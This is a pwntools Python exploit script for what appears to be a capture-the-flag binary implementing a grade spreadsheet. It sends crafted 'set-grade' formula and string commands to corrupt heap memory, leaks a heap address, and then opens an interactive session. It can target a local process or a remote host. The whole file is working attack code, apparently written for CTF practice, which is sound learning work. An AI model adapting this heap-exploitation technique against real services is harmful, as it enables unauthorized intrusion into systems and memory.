#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("chall")
libc = e.libc
gs = """
ida_connect
b f1
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


p = start()


def type0(x, y, point):
    return f'set-grade {x} {y} {point}'.encode()


def type1(x, y, name):
    return f'set-grade {x} {y} "'.encode()+name


def type2(x, y, a, b, point0, point1, point2):
    return f'set-grade {x} {y} =IF({a}:{b} > {point0},{point1},{point2})'.encode()


def show(): return p.sendlineafter(b'> ', "show-grades")


p.sendlineafter(b'> ', type2(0, 0, 0, 0, 0, 0, 0))
p.sendlineafter(b'> ', type2(0, 1, 0, 0, 0, 0, 0))
p.sendlineafter(b'> ', type2(0, 2, 0, 0, 0, 0, 0))


p.sendlineafter(b'> ', type1(0, 0, b'A'*0x10))
p.sendlineafter(b'> ', type0(0, 0, 0x1337))

p.sendlineafter(b'> ', type1(0, 3, b''))

show()
p.recvuntil(b'4919   0      0      ')
heap = u64(p.recv(5)+b'\0'*3) << 12
log.success(f"heap @ {hex(heap)}")

p.interactive()
